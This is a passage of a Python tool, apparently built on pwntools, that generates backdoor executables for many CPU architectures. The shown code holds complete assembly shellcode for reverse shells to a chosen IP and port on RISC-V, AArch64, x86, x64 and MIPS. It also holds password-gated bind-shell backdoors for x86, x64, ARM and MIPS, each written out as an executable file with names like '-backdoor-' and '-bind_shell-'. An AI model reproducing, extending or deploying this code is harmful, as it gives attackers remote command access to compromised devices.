		sw      $s0, -4($sp)
		lw      $a0, -4($sp)
		move     $a1,$sp
		li      $t9, -17
		nor     $a2, $t9, $zero
		li      $v0, 0x13b1
		syscall 0x40404
		'''
	shellcode_connect = shellcode_connect % (reverse_port, reverse_ip_high, reverse_ip_low)
	shellcode_dup_sh='''
	xor $t2,$t2
	move $a1,$t2
	li  $v0,0x13A8
	syscall 0x40404
	li  $t9,-2
	nor $a1,$t9,$zero
	li  $v0,0x13A8
	syscall 0x40404
	li  $t9,-3
	nor $a1,$t9,$zero
	li  $v0,0x13A8
	syscall 0x40404
	'''
	shellcode_execve='''
	lui     $t1, 0x2f62
	ori     $t1, $t1, 0x696e
	sw      $t1, -8($sp)
	lui     $t9, 0xd08c
	ori     $t9, $t9, 0x97ff
	nor     $t1, $t9, $zero
	sw      $t1, -4($sp)
	daddiu   $sp, $sp, -8
	dadd     $a0, $sp, $zero
	lui     $t1, 0x2f62
	ori     $t1, $t1, 0x696e
	sw      $t1, -12($sp)
	lui     $t9, 0xd08c
	ori     $t9, $t9, 0x97ff
	nor     $t1, $t9, $zero
	sw      $t1, -8($sp)
	sw      $zero, -4($sp)
	daddiu   $sp, $sp, -12
	slti    $a1, $zero, -1
	sd      $a1, -8($sp)
	daddi    $sp, $sp, -8
	li      $t9, -9
	nor     $a1, $t9, $zero
	dadd     $a1, $sp, $a1
	sd      $a1, -8($sp)
	daddi    $sp, $sp, -8
	dadd     $a1, $sp, $zero
	slti    $a2, $zero, -1
	li      $v0,0x13c1
	syscall 0x40404
	'''
	data_shellcode=asm(shellcode_connect)+asm(shellcode_dup_sh)+asm(shellcode_execve)
	shellcode_len = len(data_shellcode)
	shellcode_hex = ''
	shellcode_hex = extract_shellcode.extract_sl_print(data_shellcode, shellcode_hex)
	if "\\x00" in shellcode_hex:
		#log.info("waiting 3s")
		#sleep(1)
		log.info("pay attaction NULL byte in shellcode(len is {})".format(shellcode_len))
		log.info("the null byte in {}".format(data_shellcode.index(b"\x00")))
		print(shellcode_hex)
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
		return data_shellcode
	else:
		#log.info("waiting 3s")
		#sleep(1)
		log.success("No NULL byte shellcode for hex(len is {}):".format(shellcode_len))
		print(shellcode_hex)
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
		return data_shellcode
		
def riscv64el_backdoor(shell_path ,reverse_ip,reverse_port, envp ,filename=None):
	'''
	socket 0xc6
	connect 0xcb
	dup2 0x18
	'''
	context.arch='riscv'
	context.bits="64"
	context.endian="little"
	log.success("reverse_ip is: "+ reverse_ip)
	log.success("reverse_port is: "+str(reverse_port))
	reverse_ip=reverse_ip.split(".")[::-1]
	reverse_ip_new='0x'
	for i in  range(4):
		reverse_ip_new+=enhex(p8(int(reverse_ip[i])))
	reverse_port=enhex(p16(reverse_port))+"0002"
	all_reverse_infor=reverse_ip_new+reverse_port
	shellcode_connect='''
	li a0,2
	li a1,1
	li a2,0
	li a7,0xc6
	ecall
	mv a6,a0
	li s1,%s
	sd s1,-16(sp)
	add a1,sp,-16
	li a2,16
	li a7,0xcb
	ecall
	'''
	shellcode_connect=shellcode_connect%(all_reverse_infor)
	shellcode_connect=asm(shellcode_connect)
	shellcode_dup_sh='''
	mv a0,a6
	li a1,0
	li a2,0
	li a7,0x18
	ecall
	mv a0,a6
	add a1,a1,1
	ecall
	mv a0,a6
	add a1,a1,1
	ecall
	'''
	shellcode_dup_sh=asm(shellcode_dup_sh)
	if shell_path == "/bin/sh" or shell_path == "sh":
		shellcode_execve='''
		li s1, 0x68732f2f6e69622f
		sd s1, -48(sp)
		li s1, 0x692d
		sd s1, -64(sp)
		addi a0,sp,-48
		sd a0, -16(sp)
		addi a5,sp,-64
		sd a5, -8(sp)
		sd zero, 0(sp)
		addi a1,sp,-16
		slt a2,zero,-1 
		li a7, 221
		ecall
		'''
	elif shell_path == "/bin/bash" or shell_path == "bash":
		shellcode_execve = '''
		li s1, 0x687361622f6e6962
		sd s1, -16(sp)
		li s1, 0x2f00000000000000
		sd s1, -24(sp)
		li s1, 0x692d
		sd s1, -32(sp)
		sd zero, -8(sp)
		addi a0,sp,-17
		sd a0, -64(sp)
		addi a5,sp,-32
		sd a5, -56(sp)
		add a1,sp,-64
		sd zero,-48(sp)
		slt a2,zero,-1
		li a7, 221
		ecall
		'''

	else:
		log.info("now shell is only support sh and bash")
		return 
	if(envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)
	shellcode_execve=asm(shellcode_execve)
	shellcode = shellcode_connect+shellcode_dup_sh+shellcode_execve
	ELF_data =make_elf(shellcode)
	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-backdoor-" + my_package.random_string_generator(4,chars)
		f=open(filename,"wb")
		f.write(ELF_data)
		f.close()
		os.chmod(filename, 0o755)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			f=open(filename,"wb")
			f.write(ELF_data)
			f.close()
			os.chmod(filename, 0o755)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				f=open(filename,"wb")
				f.write(ELF_data)
				f.close()
				os.chmod(filename, 0o755)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 

def android_aarch64_backdoor(shell_path ,reverse_ip,reverse_port, envp ,filename=None):
	context.arch='aarch64'
	context.endian='little'
	context.bits="64"
	log.success("reverse_ip is: "+ reverse_ip)
	log.success("reverse_port is: "+str(reverse_port))
	shell_path_list = []
	if shell_path == "/bin/bash" or shell_path == "bash":
		shellcode_execve = '''
/* execve(path='/bin/bash', argv=['/bin/bash', '-i'], envp=0) */
/* push b'/bin/bash\x00' */
/* Set x14 = 8314034342958031407 = 0x7361622f6e69622f */
mov  x14, #25135
movk x14, #28265, lsl #16
movk x14, #25135, lsl #0x20
movk x14, #29537, lsl #0x30
mov  x15, #104
stp x14, x15, [sp, #-16]!
mov  x0, sp
/* push argument array [b'/bin/bash\x00', b'-i\x00'] */
/* push b'/bin/bash\x00-i\x00' */
/* Set x14 = 8314034342958031407 = 0x7361622f6e69622f */
mov  x14, #25135
movk x14, #28265, lsl #16
movk x14, #25135, lsl #0x20
movk x14, #29537, lsl #0x30
/* Set x15 = 1764556904 = 0x692d0068 */
mov  x15, #104
movk x15, #26925, lsl #16
stp x14, x15, [sp, #-16]!

/* push null terminator */
mov  x14, xzr
str x14, [sp, #-8]!

/* push pointers onto the stack */
mov  x14, #18
add x14, sp, x14
sub sp, sp ,8
str x14, [sp, #-8]!
mov  x14, #24
add x14, sp, x14
sub sp, sp, 8
stp x5, x14 , [sp, #-8]!

add x1, sp, 8

/* set x1 to the current top of the stack */
mov  x2, xzr
/* call execve() */
mov  x8, #0xdd
svc 0

		'''
	elif shell_path == "/bin/sh" or shell_path == "sh":
		shellcode_execve ='''
mov  x14, #25135
movk x14, #28265, lsl #16
movk x14, #29487, lsl #0x20
movk x14, #104, lsl #0x30
str x14, [sp, #-16]!
mov  x0, sp
/* push argument array [b'/bin/sh\x00', b'-i\x00'] */
/* push b'/bin/sh\x00-i\x00' */
/* Set x14 = 29400045130965551 = 0x68732f6e69622f */
mov  x14, #25135
movk x14, #28265, lsl #16
movk x14, #29487, lsl #0x20
movk x14, #104, lsl #0x30
mov  x15, #26925
stp x14, x15, [sp, #-16]!

/* push null terminator */
mov  x14, xzr
str x14, [sp, #-8]!

/* push pointers onto the stack */
mov  x14, #16
add x14, sp, x14
sub sp, sp, 8

str x14, [sp, #-8]! /* b'/bin/sh\x00' */
mov  x14, #24
add x14, sp, x14
sub sp, sp, 8
str x14, [sp, #0]! /* b'-i\x00' */

mov x1, sp

/* set x1 to the current top of the stack */
mov  x2, xzr
/* call execve() */
mov  x8, #0xdd
svc 0

		'''
	else:
		log.info("now shell is only support sh and bash")
		return 
	if(envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)

	basic_shellcode=asm(shellcraft.connect(reverse_ip,reverse_port))
	shellcode2='''
	mov x0,x12
	mov x1,#0
	mov x2,#0
	mov x8,#0x18
	svc #0x1337
	mov x0,x12
	mov x1,#1
	svc #1337
	mov x0,x12
	mov x1,#2
	svc #1337
	'''
	shellcode2=asm(shellcode2)
	shellcode3=asm(shellcode_execve)
	all_reverseshell=basic_shellcode+shellcode2+shellcode3
	#all_reverseshell=shellcode3
	ELF_data = make_elf(all_reverseshell)
	if filename==None:
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-backdoor-" + my_package.random_string_generator(4,chars)
		f=open(filename,"wb")
		f.write(ELF_data)
		f.close()
		os.chmod(filename, 0o755)
		log.success("{} is ok in current path ./".format(filename))
		context.arch='i386'
		context.bits="32"
		context.endian="little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			f=open(filename,"wb")
			f.write(ELF_data)
			f.close()
			os.chmod(filename, 0o755)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				f=open(filename,"wb")
				f.write(ELF_data)
				f.close()
				os.chmod(filename, 0o755)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 


'''
2022.10.20
Add bind shellcode and backdoor module ,Plan to complete all architectures within 3 weeks
'''

'''
x64 bindshell backdoor
'''



def x64_bind_shell(listen_port, passwd, filename=None):
	context.arch = 'amd64'
	context.endian = 'little'
	context.bits = '64'
	log.success("bind port is set to "+ str(listen_port))
	log.success("passwd is set to '%s'"%passwd)
	listen_port = '0x'+enhex(p16(listen_port))
	passwd_len = hex(len(passwd))
	#passwd = '0x'+enhex(p64(int("0x"+enhex(passwd.encode()),16)).replace(b"\x00",b'')).rjust(16,"0")
	passwd = "0x"+enhex(p64(int("0x"+enhex(passwd.encode()),16)).replace(b"\x00",b'')).rjust(16,"0")
	shellcode = '''
	push   0x29
	pop    rax
	push   0x2
	pop    rdi
	push   0x1
	pop    rsi
	xor    rdx,rdx
	syscall 
	push   rax
	pop    rdi
	push   rdx
	push   rdx
	pushw  %s
	pushw  0x2
	push   0x31
	pop    rax
	push   rsp
	pop    rsi
	mov    dl,0x10
	syscall
	push  0x32
	pop    rax
	push   0x2
	pop    rsi
	syscall 
 	push   0x2b
 	pop    rax
	xor    rsi,rsi
	cdq    
	syscall 
	push   rax
	pop    rdi
	push   0x2
	pop    rsi
	push   0x21
	pop    rax
	syscall
	push   rax
	pop    rdi
	push   0x2
	pop    rsi
	push   0x21
	pop    rax
	syscall
	dec    rsi
	jns    $-8
	push   0x1
	pop    rax
	movabs r9,0x203a647773736150
	push   r9
	mov    rsi,rsp
	push   0x8
	pop    rdx
	syscall
	mov    rdx, %s
	xor    rax,rax
	add    rsi,0x8
	syscall 
	movabs rax,%s
	push   rsi
	pop    rdi
	scas   rax,QWORD PTR es:[rdi]
	jne    $+0x1e
	xor    rax,rax
	push   rax
	movabs rbx,0x68732f2f6e69622f
	push   rbx
	push   rsp
	pop    rdi
	push   rax
	push   rsp
	pop    rdx
	push   rdi
	push   rsp
	pop    rsi
	push   0x3b
	pop    rax
	syscall 
	'''
	shellcode = asm(shellcode%(listen_port, passwd_len, passwd))
	ELF_data =make_elf(shellcode)
	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-bind_shell-" + my_package.random_string_generator(4,chars)
		f=open(filename,"wb")
		f.write(ELF_data)
		f.close()
		os.chmod(filename, 0o755)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			f=open(filename,"wb")
			f.write(ELF_data)
			f.close()
			os.chmod(filename, 0o755)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				f=open(filename,"wb")
				f.write(ELF_data)
				f.close()
				os.chmod(filename, 0o755)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 

'''
x86 bindshell backdoor

Completion time 2022.10.26 12:07
'''

def x86_bind_shell(listen_port, passwd, filename=None):
	context.arch = 'i386'
	context.endian = 'little'
	context.bits = '32'
	log.success("bind port is set to "+ str(listen_port))
	log.success("passwd is set to '%s'"%passwd )
	listen_port = '0x'+enhex(p16(listen_port))
	passwd_len = hex(len(passwd))
	passwd = "0x"+enhex(p32(int("0x"+enhex(passwd.encode()),16)).replace(b"\x00",b'')).rjust(16,"0")
	shellcode = '''
	push 0x1
	pop ebx
	xor edx,edx
	push edx
	push 0x66
	pop eax
	push ebx
	push 0x2
	mov ecx,esp
	int 0x80
	mov esi,eax
	push 0x66
	pop eax
	mov ebx,0x2
	push dx
	push %s
	push bx
	mov ecx,esp
	push 0x10
	push ecx
	push esi
	mov ecx,esp
	int 0x80
	push 0x66
	pop eax
	mov bl,4
	push 0
	push esi
	mov ecx,esp
	int 0x80
	push 0x66
	pop eax
	inc ebx
	push edx
	push edx
	push esi
	mov ecx,esp
	int 0x80
	mov ebx,eax
	xor ecx,ecx
	mov cl,2
	mov al,0x3f
	int 0x80
	dec ecx
	jns $-5
	push 0x003a6477
	push 0x73736150
	mov  ecx,esp
	push 4
	pop  eax
	push 8
	pop  edx
	int 0x80
	push 3
	pop eax
	xor ecx,ecx
	sub esp,8
	mov ecx,esp
	push %s
	pop edx
	int 0x80
	mov edi,[esp]
	cmp edi,%s
	jne $+80
	push 0x68
	push 0x732f2f2f
	push 0x6e69622f
	mov ebx, esp
	/* push argument array ['sh\x00'] */
	/* push 'sh\x00\x00' */
	push 0x1010101
	xor dword ptr [esp], 0x1016972
	xor ecx, ecx
	push ecx /* null terminate */
	push 4
	pop ecx
	add ecx, esp
	push ecx /* 'sh\x00' */
	mov ecx, esp
	xor edx, edx
	/* call execve() */
	push SYS_execve /* 0xb */
	pop eax
	int 0x80
	'''
	shellcode = asm(shellcode%(listen_port, passwd_len, passwd))
	ELF_data = make_elf(shellcode)
	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-bind_shell-" + my_package.random_string_generator(4,chars)
		f=open(filename,"wb")
		f.write(ELF_data)
		f.close()
		os.chmod(filename, 0o755)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			f=open(filename,"wb")
			f.write(ELF_data)
			f.close()
			os.chmod(filename, 0o755)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				f=open(filename,"wb")
				f.write(ELF_data)
				f.close()
				os.chmod(filename, 0o755)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 

'''
Armv7 bindshell backdoor file

2022.10.26 updating more appear

fish 2022.10.27 powered by doudou
'''
def armelv7_bind_shell(listen_port, passwd, filename=None):
	context.arch = 'arm'
	context.endian = 'little'
	context.bits = '32'
	log.success("bind port is set to "+ str(listen_port))
	log.success("passwd is set to '%s'"%passwd )
	listen_port = '0x'+enhex(p16(listen_port))
	passwd_len = hex(len(passwd))
	passwd = "0x"+enhex(p32(int("0x"+enhex(passwd.encode()),16)).replace(b"\x00",b'')).rjust(8,"0")
	passwd_high = passwd[:6]
	passwd_low  = "0x"+passwd[6:10]
	shellcode = shellcraft.socket(2,1,0)
	shellcode += '''
	mov  r6, r0
	movw r7, #2
	movt r7, #%s
	push {r2}
	push {r7}
	mov  r1,sp
	mov  r2,#0x10  
	movw r7, 0x11a
	svc #0
	mov r0,r6
	eor r1,r1
	movw r7,#284
	svc #0
	mov r0,r6
	eor r2,r2
	movw r7, 0x11d
    svc #0
    mov r6,r0
	movw r7, #0x41414100 & 0xffff
	movt r7, #0x41414100 >> 16
	push {r7}
	movw r7, #0x203a6477 & 0xffff
	movt r7, #0x203a6477 >> 16
	push {r7}
	movw r7, #0x73736150 & 0xffff
	movt r7, #0x73736150 >> 16
	push {r7}
	mov  r1, sp
	mov  r0, r6
	mov  r2, #8
	/* call write() */
	mov  r7, #SYS_write /* 4 */
	svc  #0
	sub  sp, 0x20
	mov  r0, r6
	mov  r1, sp
	mov  r2, #%s
	mov  r7, #3
	svc  #0
	mov  r7,sp
	ldr  r7,[r7]
	movw r5,#%s
	movt r5,#%s
	cmp  r7,r5
	'''
	shellcode = asm(shellcode % (listen_port, passwd_len ,passwd_low ,passwd_high))
	shellcode += b"\x80\x00\x00\x1a"
	shellcode_dump = '''
	mov r1,#2
	mov r0,r6
	mov r7,#63
	svc #0
	sub r1, r1, #1
	cmp r1,#0
	'''
	shellcode += asm(shellcode_dump) + b"\xF9\xFF\xFF\xaa"
	shellcode += asm(shellcraft.execve("/bin/sh",["/bin/sh"],0))
	ELF_data = make_elf(shellcode)
	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-bind_shell-" + my_package.random_string_generator(4,chars)
		f=open(filename,"wb")
		f.write(ELF_data)
		f.close()
		os.chmod(filename, 0o755)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			f=open(filename,"wb")
			f.write(ELF_data)
			f.close()
			os.chmod(filename, 0o755)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				f=open(filename,"wb")
				f.write(ELF_data)
				f.close()
				os.chmod(filename, 0o755)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 

'''
Armv7eb bindshell backdoor file

date : 2022.10.28 
'''

def armv7eb_bind_shell(listen_port, passwd, filename = None):
	context.arch = 'arm'
	context.endian = 'big'
	context.bits = '32'
	log.success("bind port is set to "+ str(listen_port))
	log.success("passwd is set to '%s'"%passwd )
	listen_port = '0x'+enhex(p16(listen_port))
	passwd_len = hex(len(passwd))
	passwd = "0x"+enhex(p32(int("0x"+enhex(passwd.encode()),16)).replace(b"\x00",b'')).ljust(8,"0")
	passwd_high = passwd[:6]
	passwd_low  = "0x"+passwd[6:10]
	shellcode = shellcraft.socket(2,1,0)
	shellcode += '''
	mov  r6, r0
	movw r7, #%s
	movt r7, #2
	push {r2}
	push {r7}
	mov  r1,sp
	mov  r2,#0x10  
	movw r7, 0x11a
	svc #0
	mov r0,r6
	eor r1,r1
	movw r7,#284
	svc #0
	mov r0,r6
	eor r2,r2
	movw r7, 0x11d
    svc #0
    mov r6,r0
	movw r7, #0x414141 & 0xffff
	movt r7, #0x414141 >> 16
	push {r7}
	movw r7, #0x77643a20 & 0xffff
	movt r7, #0x77643a20 >> 16
	push {r7}
	movw r7, #0x50617373 & 0xffff
	movt r7, #0x50617373 >> 16
	push {r7}
	mov  r1, sp
	mov  r2, #8
	/* call write() */
	mov  r7, #SYS_write /* 4 */
	svc  0
	sub  sp, 0x20
	mov  r0, r6
	mov  r1, sp
	mov  r2, #%s
	mov  r7, #3
	svc  #0
	mov  r7,sp
	ldr  r7,[r7]
	movw r5,#%s
	movt r5,#%s
	cmp  r7,r5
	'''
	shellcode = asm(shellcode % (listen_port, passwd_len ,passwd_low ,passwd_high))
	shellcode += b"\x80\x00\x00\x1a"[::-1]
	shellcode_dump = '''
	mov r1,#2
	mov r0,r6
	mov r7,#63
	svc #0
	sub r1, r1, #1
	cmp r1,#0
	'''
	shellcode += asm(shellcode_dump) + b"\xF9\xFF\xFF\xaa"[::-1]
	shellcode += asm(shellcraft.execve("/bin/sh",["/bin/sh"],0))
	ELF_data = make_elf(shellcode)
	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-bind_shell-" + my_package.random_string_generator(4,chars)
		f=open(filename,"wb")
		f.write(ELF_data)
		f.close()
		os.chmod(filename, 0o755)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			f=open(filename,"wb")
			f.write(ELF_data)
			f.close()
			os.chmod(filename, 0o755)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				f=open(filename,"wb")
				f.write(ELF_data)
				f.close()
				os.chmod(filename, 0o755)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 


'''
x86 x64el_backdoor
2022.10.31 add
'''
def x64el_backdoor(shell_path ,reverse_ip, reverse_port, envp ,filename=None):
	context.arch = 'amd64'
	context.endian = 'little'
	context.bits = '64'
	log.success("reverse_ip is: "+ reverse_ip)
	log.success("reverse_port is: "+str(reverse_port))
	shell_path_list = []
	if shell_path == "/bin/bash" or shell_path == "bash":
		shell_path = "/bin/bash"
		shell_path_list.append(shell_path)
		shell_path_list.append("-i")
	elif shell_path == "/bin/sh" or shell_path == "sh":
		shell_path = "/bin/sh"
		shell_path_list.append(shell_path)
		shell_path_list.append("-i")
	else:
		log.info("now shell is only support sh and bash")
		return 
	if(envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)
	shellcode = shellcraft.connect(reverse_ip, reverse_port)
	shellcode += shellcraft.dup2('rbp',0)+shellcraft.dup2('rbp',1)+ shellcraft.dup2("rbp",2)
	shellcode += shellcraft.execve(shell_path, shell_path_list, envp)
	shellcode = asm(shellcode)
	ELF_data = make_elf(shellcode)
	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-backdoor-" + my_package.random_string_generator(4,chars)
		f=open(filename,"wb")
		f.write(ELF_data)
		f.close()
		os.chmod(filename, 0o755)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			f=open(filename,"wb")
			f.write(ELF_data)
			f.close()
			os.chmod(filename, 0o755)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				f=open(filename,"wb")
				f.write(ELF_data)
				f.close()
				os.chmod(filename, 0o755)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 
'''
x86 x86el_backdoor
2022.10.31 add
'''
def x86el_backdoor(shell_path ,reverse_ip, reverse_port, envp ,filename =None):
	context.arch = 'i386'
	context.bits = "32"
	context.endian = "little"
	log.success("reverse_ip is: "+ reverse_ip)
	log.success("reverse_port is: "+str(reverse_port))
	shell_path_list = []
	if shell_path == "/bin/bash" or shell_path == "bash":
		shell_path = "/bin/bash"
		shell_path_list.append(shell_path)
		shell_path_list.append("-i")
	elif shell_path == "/bin/sh" or shell_path == "sh":
		shell_path = "/bin/sh"
		shell_path_list.append(shell_path)
		shell_path_list.append("-i")
	else:
		log.info("now shell is only support sh and bash")
		return 
	if(envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)
	shellcode = shellcraft.connect(reverse_ip, reverse_port)
	shellcode += shellcraft.dup2('edx',0)+shellcraft.dup2('edx',1)+ shellcraft.dup2("edx",2)
	shellcode += shellcraft.execve(shell_path, shell_path_list, envp)
	shellcode = asm(shellcode)
	ELF_data = make_elf(shellcode)
	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-backdoor-" + my_package.random_string_generator(4,chars)
		f=open(filename,"wb")
		f.write(ELF_data)
		f.close()
		os.chmod(filename, 0o755)
		log.success("{} is ok in current path ./".format(filename))
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			f=open(filename,"wb")
			f.write(ELF_data)
			f.close()
			os.chmod(filename, 0o755)
			log.success("{} is ok in current path ./".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				f=open(filename,"wb")
				f.write(ELF_data)
				f.close()
				os.chmod(filename, 0o755)
				log.success("{} is ok in current path ./".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 



'''
mipsel bindshell backdoor

2022.10.31
'''
def mipsel_bind_shell(listen_port, passwd,filename = None):
	context.arch = 'mips'
	context.endian = 'little'
	context.bits = '32'
	log.success("bind port is set to "+ str(listen_port))
	log.success("passwd is set to '%s'"%passwd )
	listen_port = '0x'+enhex(p16(listen_port))
	passwd_len = hex(len(passwd))
	passwd = "0x"+enhex(p32(int("0x"+enhex(passwd.encode()),16)).replace(b"\x00",b'')).rjust(8,"0")
	#passwd_high = passwd[:6]
	#passwd_low  = "0x"+passwd[6:10]
	shellcode = shellcraft.socket(2,2,0)
	shellcode +='''
	addiu  $sp,$sp,-32
	li $t7,0x7350
	andi   $s0, $v0, 0xffff
	addiu  $t6, $zero, -0x11
	not    $t6, $t6
	addiu  $t5, $zero, %s
	sllv   $t5, $t5, $t6
	addiu  $t6, $zero, -0x3
	not    $t6, $t6
	or     $t5, $t5, $t6
	sw     $t5, -0x20($sp)
	sw     $zero, -0x1c($sp)
	sw     $zero, -0x18($sp)
	sw     $zero, -0x14($sp)
	or     $a0, $s0, $s0
	addiu  $t6, $zero, -0x11
	not    $a2, $t6
	addi   $a1, $sp, -0x20
	addiu  $v0, $zero, 0x1049
	syscall 0x40404
	addiu  $t7, $zero, 0x7350
	or     $a0, $s0, $s0
	addiu  $a1, $zero, 0x101
	addiu  $v0, $zero, 0x104e
	syscall 0x40404
	addiu  $t7, $zero, 0x7350
	or     $a0, $s0, $s0
	slti   $a1, $zero, -1
	slti   $a2, $zero, -1
	addiu  $v0, $zero, 0x1048
	syscall 0x40404
	addiu  $t7, $zero, 0x7350
	andi   $s0, $v0, 0xffff
	or     $a0, $s0, $s0
	addiu  $t7, $zero, -3
	not    $a1, $t7
	addiu  $v0, $zero, 0xfdf
	syscall 0x40404
	addiu  $t7, $zero, 0x7350
	or     $a0, $s0, $s0
	slti   $a1, $zero, 0x101
	addiu  $v0, $zero, 0xfdf
	syscall 0x40404
	addiu  $t7, $zero, 0x7350
	or     $a0, $s0, $s0
	slti   $a1, $zero, -1
	addiu  $v0, $zero, 0xfdf
	syscall 0x40404
	'''
	#print(passwd)
	shellcode = shellcode%(listen_port)
	shellcode = asm(shellcode)
	shellcode += asm(shellcraft.write("$s0","Passwd: ",8))
	shellcode += asm("addiu  $sp, $sp, -0x40")
	shellcode += asm(shellcraft.read("$s0","$sp",passwd_len))
	shellcode += asm("li $s1, %s\nlw $s3, ($sp)"%(passwd))+b"\x18\x20\x71\x16"
	shellcode += asm(shellcraft.execve("/bin/sh",["/bin/sh"],0))
	#shellcode = asm(shellcode)
	ELF_data = make_elf(shellcode)
	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-bind_shell-" + my_package.random_string_generator(4,chars)
		f=open(filename,"wb")
		f.write(ELF_data)
		f.close()
		os.chmod(filename, 0o755)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			f=open(filename,"wb")
			f.write(ELF_data)
			f.close()
			os.chmod(filename, 0o755)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				f=open(filename,"wb")
				f.write(ELF_data)
				f.close()
				os.chmod(filename, 0o755)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 

'''
mips bindshell

add 2022.11.1 
'''
def mips_bind_shell(listen_port, passwd, filename=None ):
	context.arch = 'mips'
	context.endian = 'big'
	context.bits = '32'
	log.success("bind port is set to "+ str(listen_port))
	log.success("passwd is set to '%s'"%passwd )
	listen_port = '0x'+enhex(p16(listen_port))
	passwd_len = hex(len(passwd))
